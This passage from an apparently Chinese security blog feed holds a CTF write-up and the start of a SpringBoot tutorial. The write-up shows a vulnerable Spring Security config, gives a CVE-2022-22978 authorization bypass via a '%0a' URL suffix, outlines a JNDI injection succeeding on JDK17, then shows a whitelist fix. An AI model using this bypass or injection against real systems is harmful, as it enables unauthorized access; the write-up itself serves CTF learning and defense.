class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>builders<span class="token punctuation">.</span></span><span class="token class-name">HttpSecurity</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>configuration<span class="token punctuation">.</span></span><span class="token class-name">EnableWebSecurity</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>configurers<span class="token punctuation">.</span></span><span class="token class-name">ExpressionUrlAuthorizationConfigurer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">SecurityFilterChain</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@EnableWebSecurity</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityConfig</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">SecurityConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http<span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">(</span>authorize<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ExpressionUrlAuthorizationConfigurer<span class="token punctuation">.</span>AuthorizedUrl</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ExpressionUrlAuthorizationConfigurer<span class="token punctuation">.</span>AuthorizedUrl</span><span class="token punctuation">)</span>authorize<span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/admin/.*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">SecurityFilterChain</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆæ˜æ˜¾ï¼Œç¬¬ä¸€æ­¥é¦–å…ˆè¦ç»•è¿‡spring securityçš„é™åˆ¶è®¿é—®adminè·¯ç”±</p><p>çœ‹ä¸€ä¸‹spring-securityåŒ…çš„ç‰ˆæœ¬ï¼Œ5.6.2</p><p>ç›´æ¥ç”¨<a href="https://xz.aliyun.com/t/13235">CVE-2022-22978</a>ç»•è¿‡ï¼Œè®¿é—®<code>/admin/lookup/%0a</code>å³å¯è¿›å…¥åˆ°lookup</p><p>ç„¶åçœ‹lookupçš„æ“ä½œï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Context</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span> result <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"Lookup successful: "</span> <span class="token operator">+</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€çœ¼jndiï¼Œç„¶åæˆ‘ä¸ä¼šæ‰“</p><blockquote><p>ååºåˆ—åŒ–å°±jacksonï¼ŒFactoryObjectå°±BeanFactory<br>jackson1234éƒ½æ²¡æ‰“é€šï¼ŒBeanFactory-ELä¹Ÿæ‰“ä¸é€šã€‚æœ€åBeanFactory-yamlæ‰“æˆåŠŸäº†æ‰æ˜ç™½æ˜¯JDK17ï¼Œä¿®å¤äº†å¾ˆå¤šJNDIç»•è¿‡çš„åŠæ³•</p></blockquote><h3 id="FIX-1"><a href="#FIX-1" class="headerlink" title="FIX"></a>FIX</h3><p>ç›´æ¥è®©GPT-4oä»£å·¥ï¼Œç„¶åè‡ªå·±æ‰“åŒ…</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AdminController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Pattern</span> <span class="token constant">SAFE_URL_PATTERN</span> <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"^[a-zA-Z0-9:/._-]+$"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token constant">ALLOWED_URLS</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Populate the whitelist with allowed JNDI URLs</span>        <span class="token constant">ALLOWED_URLS</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"java:comp/env/jdbc/myDataSource"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Add other allowed URLs here</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">AdminController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/lookup/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"url"</span><span class="token punctuation">,</span> required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"missing url parameter"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Validate the URL input against the pattern</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">SAFE_URL_PATTERN</span><span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"Invalid URL format"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Check if the URL is in the whitelist</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">ALLOWED_URLS</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"URL not allowed"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Context</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> result <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"Lookup successful: "</span> <span class="token operator">+</span> result<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            ex<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"Lookup failed"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="mycmsï¼ˆUnsolvedï¼‰"><a href="#mycmsï¼ˆUnsolvedï¼‰" class="headerlink" title="mycmsï¼ˆUnsolvedï¼‰"></a>mycmsï¼ˆUnsolvedï¼‰</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ä¸ªäººåç§°ï¼šé›²æµ&lt;/p&gt;
&lt;p&gt;ä¸ªäººæ’åï¼š68&lt;/p&gt;
&lt;p&gt;ç­¾åˆ°é¢˜éƒ½åšä¸æ¥æœ‰ç‚¹éš¾ç»·&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€åçš„wpï¼š&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&amp;mid=2247486883&amp;idx=1&amp;sn=4a99836ee029141df32979be33b0a663&quot;&gt;https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&amp;amp;mid=2247486883&amp;amp;idx=1&amp;amp;sn=4a99836ee029141df32979be33b0a663&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="CVE" scheme="http://c1oudfl0w0.github.io/blog/tags/CVE/"/>
    
    <category term="ææƒ" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="SSTI" scheme="http://c1oudfl0w0.github.io/blog/tags/SSTI/"/>
    
    <category term="Spring" scheme="http://c1oudfl0w0.github.io/blog/tags/Spring/"/>
    
    <category term="JNDI" scheme="http://c1oudfl0w0.github.io/blog/tags/JNDI/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/28/SpringBoot/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/28/SpringBoot/</id>
    <published>2024-06-28T04:17:55.000Z</published>
    <updated>2024-07-15T14:00:33.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å¼€å‘ä¸å®‰å…¨ç¼ºä¸€ä¸å¯ï¼Œè™½ç„¶ä¸çŸ¥é“è‡ªå·±åˆ°åº•å°‘å­¦äº†å¤šå°‘åŸºç¡€ï¼Œä½†æ˜¯ç°åœ¨å°±å…ˆè·Ÿç€<a href="https://github.com/Drun1baby/JavaSecurityLearning?tab=readme-ov-file">Drun1babyçš„å­¦ä¹ è·¯çº¿</a>å§</p><p>javaç¬¬ä¸€æ­¥ï¼Œå…ˆå­¦SpringBootï¼ŒåŒæ—¶æˆ‘è¿™é‡Œä¹Ÿä¼šç¨å¾®å­¦ä¸€ä¸‹Springå’ŒSpringMVC</p><p>å‚è€ƒï¼š</p><p><a href="https://www.bilibili.com/video/BV1PE411i7CV">https://www.bilibili.com/video/BV1PE411i7CV</a></p><p><a href="https://www.yuque.com/boogipop/ot88z5/bho0otrcaa8kl1xf">https://www.yuque.com/boogipop/ot88z5/bho0otrcaa8kl1xf</a></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628122350310.png" alt="image-20240628122350310"></p><span id="more"></span><hr><h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p>Springæ˜¯ä¸€ä¸ªåˆ†å±‚çš„ JavaSE&#x2F;EE full-stack(ä¸€ç«™å¼) è½»é‡çº§å¼€æºæ¡†æ¶ï¼Œå¯ä»¥è¯´æ˜¯ç»™Javaç¨‹åºå‘˜å¸¦æ¥äº†æ˜¥å¤©ï¼Œå› ä¸ºå®ƒçš„ä¼˜ç‚¹æ˜¯æå¤§åœ°ç®€åŒ–äº†å¼€å‘</p><p>Springçš„ç†å¿µï¼šä¸å»é‡æ–°å‘æ˜è½®å­ã€‚å…¶æ ¸å¿ƒæ˜¯<strong>æ§åˆ¶åè½¬ï¼ˆIOCï¼‰å’Œé¢å‘åˆ‡é¢ï¼ˆAOPï¼‰ã€‚</strong></p><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><hr><h1 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h1><h2 id="MVCæ¶æ„"><a href="#MVCæ¶æ„" class="headerlink" title="MVCæ¶æ„"></a>MVCæ¶æ„</h2><p>ä¹‹å‰å­¦ä¹ ThinkPHPçš„æ—¶å€™æˆ‘ä»¬å°±æ¥è§¦åˆ°MVCæ¶æ„äº†</p><p>MVCæ˜¯<strong>Modelã€Viewã€Controller</strong>çš„ç¼©å†™ï¼Œä»–ä»¬ä¸‰è€…çš„æ„æ€åˆ†åˆ«ä¸ºï¼š</p><ul><li>Modelï¼ˆæ¨¡å‹ï¼‰ï¼šç¨‹åºå‘˜éœ€è¦æ“çºµçš„æ•°æ®ä»¥åŠä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯æ•°æ®åº“</li><li>Viewï¼ˆè§†å›¾ï¼‰ï¼šæä¾›ç”¨æˆ·å‰ç«¯å±•ç¤ºç•Œé¢ï¼Œæ˜¯ç¨‹åºçš„å¤–å£³</li><li>Controllerï¼ˆæ§åˆ¶å™¨ï¼‰ï¼šä»–è´Ÿè´£æ ¹æ®ç”¨æˆ·ä»è§†å›¾å±‚è¾“å…¥çš„æŒ‡ä»¤ï¼Œé€‰å–æ•°æ®å±‚ä¸­çš„æ•°æ®ï¼Œç„¶åè¿›è¡Œå¯¹åº”çš„æ“ä½œï¼Œæœ€ç»ˆäº§ç”Ÿç»“æœ</li></ul><p>æ‰€ä»¥é¡ºåºåˆ†åˆ«æ˜¯<code>View-&gt;Controller-&gt;Model</code>ï¼Œç”±å¤–åˆ°é‡Œ</p><p>åœ¨SpringMVCä¸­è¿™ä¸‰è€…åˆ†åˆ«å°±å¯¹åº”<code>Servlet</code>ï¼Œ<code>JSP</code>ï¼Œ<code>JavaBean</code></p><hr><h2 id="Controlleré…ç½®"><a href="#Controlleré…ç½®" class="headerlink" title="Controlleré…ç½®"></a>Controlleré…ç½®</h2><p><code>@RestController</code>æ³¨è§£ï¼šæ”¾åœ¨ç±»ä¸Šå°±ç›¸å½“äºç»™æ¯ä¸ªæ–¹æ³•éƒ½åŠ äº†<code>Responsebody</code>æ³¨è§£ï¼ŒåŠ ä¸Šäº†<code>Responsebody</code>æ³¨è§£åå°±æ˜¯å•çº¯è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²</p><p><code>@RequestMapping</code>æ³¨è§£ï¼šå¯ä»¥ç”¨æ¥è®¾ç½®è·¯ç”±ï¼Œè¿™ä¸ªæ³¨è§£æ˜¯æ”¾åœ¨æ–¹æ³•ä¸Šé¢çš„ï¼Œä½†åŒæ—¶ä¹Ÿå¯ä»¥æ”¾åœ¨ä¸€ä¸ªç±»ä¸Šï¼Œ<code>GetMapping</code>å³ä»¥getæ–¹å¼è®¿é—®ï¼Œ<code>PostMapping</code>å³ä»¥postæ–¹å¼è®¿é—®</p><hr><h1 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h1><p>æ ¸å¿ƒæ€æƒ³ï¼š<strong>çº¦å®šå¤§äºé…ç½®</strong></p><p>é»˜è®¤å¸®æˆ‘ä»¬è¿›è¡Œäº†å¾ˆå¤šè®¾ç½®ï¼Œå¤šæ•° Spring Boot åº”ç”¨åªéœ€è¦å¾ˆå°‘çš„ Spring é…ç½®ï¼ŒåŒæ—¶ç»§æ‰¿äº†å¤§é‡å¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“é…ç½®ï¼ˆå¦‚ Redisï¼‰ï¼Œè¿™äº›ç¬¬ä¸‰æ–¹åº“å‡ ä¹å¯ä»¥é›¶é…ç½®å¼€ç®±å³ç”¨</p><h2 id="å¾®æœåŠ¡æ¶æ„"><a href="#å¾®æœåŠ¡æ¶æ„" class="headerlink" title="å¾®æœåŠ¡æ¶æ„"></a>å¾®æœåŠ¡æ¶æ„</h2><p>å¾®æœåŠ¡æ˜¯ä¸€ç§æ¶æ„é£æ ¼ï¼Œå®ƒè¦æ±‚æˆ‘ä»¬åœ¨å¼€å‘ä¸€ä¸ªåº”ç”¨çš„æ—¶å€™ï¼Œè¿™ä¸ªåº”ç”¨å¿…é¡»æ„å»ºæˆä¸€ç³»åˆ—å°æœåŠ¡çš„ç»„åˆï¼Œå¯ä»¥ç”¨httpçš„æ–¹å¼è¿›è¡Œäº’é€š</p><blockquote><p>å•ä½“åº”ç”¨æ¶æ„ï¼ˆall in oneï¼‰ï¼šä¸€ä¸ªåº”ç”¨ä¸­çš„æ‰€æœ‰åº”ç”¨æœåŠ¡éƒ½å°è£…åœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œæ— è®ºæ˜¯ERPã€CRMç­‰ç³»ç»Ÿï¼Œéƒ½æŠŠæ•°æ®åº“è®¿é—®ã€webè®¿é—®ç­‰åŠŸèƒ½éƒ½æ”¾åˆ°ä¸€ä¸ªwaråŒ…å†…</p></blockquote><p>è€Œå¾®æœåŠ¡æ¶æ„æ‰“ç ´äº† all in one çš„æ¶æ„æ–¹å¼ï¼ŒæŠŠæ¯ä¸ªåŠŸèƒ½å…ƒç´ ç‹¬ç«‹å‡ºæ¥ï¼ŒæŠŠç‹¬ç«‹å‡ºæ¥çš„åŠŸèƒ½å…ƒç´ è¿›è¡ŒåŠ¨æ€ç»„åˆ</p><p>æœ€åˆçš„æ¶æ„å›¾ï¼š</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628131837088.png" alt="image-20240628131837088"></p><p>éšç€éœ€æ±‚å˜å¤šï¼Œç”¨æˆ·é‡å˜å¤§ï¼Œæ•°æ®åº“å…¬ç”¨å¯èƒ½å‡ºç°å†²çªçŸ›ç›¾ï¼Œå› æ­¤å¾®æœåŠ¡æ¶æ„è¯ç”Ÿï¼Œå…¶æ¶æ„å›¾ï¼š</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628131932293.png" alt="image-20240628131932293"></p><p>å¦‚æœéœ€è¦ä¿®æ”¹å…¶ä¸­çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œåªéœ€è¦æ›´æ–°å‡çº§å…¶ä¸­ä¸€ä¸ªåŠŸèƒ½æœåŠ¡å•å…ƒå³å¯</p><hr><h2 id="ç¬¬ä¸€ä¸ªSpringBootç¨‹åº"><a href="#ç¬¬ä¸€ä¸ªSpringBootç¨‹åº" class="headerlink" title="ç¬¬ä¸€ä¸ªSpringBootç¨‹åº"></a>ç¬¬ä¸€ä¸ªSpringBootç¨‹åº</h2><p>å–œæŠ¥ï¼šå®˜æ–¹å·²ç»æä¾›äº†ä¸€ä¸ªå¿«é€Ÿç”ŸæˆSpringBootçš„ç½‘ç«™ï¼š<a href="https://start.spring.io/">https://start.spring.io/</a></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628135947174.png" alt="image-20240628135947174"></p><p>SNAPSHOTæ˜¯å¿«ç…§ç‰ˆæœ¬ï¼Œå³ä¸Šè§’å¯ä»¥æ·»åŠ ä¾èµ–ï¼Œè¿™é‡Œæ˜¯æ·»åŠ äº†ä¸ªwebä¾èµ–ï¼ˆåŒ…æ‹¬web.xmlï¼Œtomcatç­‰ï¼‰ï¼Œgenerateåä¼šä¸‹è½½ä¸€ä¸ªzipæ–‡ä»¶ï¼Œç„¶åå¯¼å…¥åˆ°IDEå³å¯</p><p>å½“ç„¶IDEAä¹Ÿé›†æˆäº†è¿™ä¸ªç½‘ç«™</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628135431282.png" alt="image-20240628135431282"></p><p>æ³¨æ„ï¼šSpring Boot 3.0.0ååªä½¿ç”¨Java 17ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œè€Œå®˜æ–¹æºä¸å†æ”¯æŒ3.0ä»¥ä¸‹çš„ç‰ˆæœ¬ï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨jdk1.8æ¥åˆ›å»ºåˆ™éœ€è¦æ¢æºä¸ºé˜¿é‡Œäº‘ï¼š<a href="https://start.aliyun.com/">https://start.aliyun.com/</a></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628140506089.png" alt="image-20240628140506089"></p><p>è®¾ç½®spring bootç‰ˆæœ¬å’Œä¾èµ–</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240629203344403.png" alt="image-20240629203344403"></p><p>äºæ˜¯å°±ç›´æ¥åˆ›å»ºäº†ï¼Œç„¶åä¾èµ–çš„jaråŒ…ä¼šè‡ªåŠ¨è¿›è¡Œä¸‹è½½</p><h3 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h3><p><img src="/blog/2024/06/28/SpringBoot/image-20240708174238564.png" alt="image-20240708174238564"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">â”œâ”€.ideaâ”‚  â””â”€librariesâ”œâ”€.mvnâ”‚  â””â”€wrapperâ”œâ”€srcâ”‚  â”œâ”€mainâ”‚  â”‚  â”œâ”€javaâ”‚  â”‚  â”‚  â””â”€comâ”‚  â”‚  â”‚      â””â”€exampleâ”‚  â”‚  â”‚          â””â”€demoâ”‚  â”‚  â””â”€resourcesâ”‚  â”‚      â”œâ”€staticâ”‚  â”‚      â””â”€templatesâ”‚  â””â”€testâ”‚      â””â”€javaâ”‚          â””â”€comâ”‚              â””â”€exampleâ”‚                  â””â”€demoâ””â”€target    â”œâ”€classes    â”‚  â””â”€com    â”‚      â””â”€example    â”‚          â””â”€demo    â””â”€generated-sources        â””â”€annotations<span aria-hidden="true" 